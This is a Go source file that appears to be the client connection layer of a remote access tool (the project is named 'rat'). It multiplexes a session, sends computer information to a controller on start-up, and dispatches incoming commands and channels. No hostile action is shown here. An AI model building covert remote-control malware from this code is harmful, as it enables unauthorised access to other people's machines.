package main

import (
	"encoding/binary"
	"errors"
	"rat/shared"
	"rat/shared/network/header"

	"github.com/xtaci/smux"
)

type Connection struct {
	Conn    *smux.Session
	control *smux.Stream

	packets chan Outgoing
	err     chan error
	die     chan struct{}
}

func NewConnection(Conn *smux.Session) (*Connection, error) {
	control, err := Conn.AcceptStream()

	if err != nil {
		return nil, err
	}

	c := &Connection{}
	c.Conn = Conn
	c.control = control
	c.packets = make(chan Outgoing)
	c.err = make(chan error, 1)
	c.die = make(chan struct{})

	return c, nil
}

func (c *Connection) Init() {
	c.packets <- &ComputerInfoPacket{}
}

func (c *Connection) Close() {
	close(c.die)
	close(c.err)
	close(c.packets)
	c.Conn.Close()
}

func (c *Connection) writeLoop() {
	var err error
	for {
		select {
		case p := <-c.packets:
			err = binary.Write(c.control, shared.ByteOrder, p.Header())
			if err != nil {
				break
			}

			err = p.Write(c.control, c)
			if err != nil {
				break
			}
		case <-c.die:
			return
		}
	}

	if err != nil {
		c.err <- err
	}
}

func (c *Connection) recvLoop() {
	var err error
	for {
		var h header.PacketHeader
		binary.Read(c.control, shared.ByteOrder, &h)

		var channel bool
		err = binary.Read(c.control, shared.ByteOrder, &channel)
		if err != nil {
			break
		}

		if channel {
			channel, is := handlerMap[h].(Channel)
			if !is {
				err = errors.New("invalid channel header " + string(h))
				break
			}

			stream, _ := c.Conn.AcceptStream()
			go func() {
				err := channel.Open(stream, c)
				select {
				case <-c.die:
				default:
					if err != nil {
						c.err <- err
					}
				}
			}()
		} else {
			packet, is := handlerMap[h].(Incoming)
			if !is {
				err = errors.New("invalid packet header " + string(h))
				break
			}

			err = packet.Read(c.control, c)
		}

		if err != nil {
			break
		}
	}

	select {
	case <-c.die:
	default:
		if err != nil {
			c.err <- err
		}
	}
}
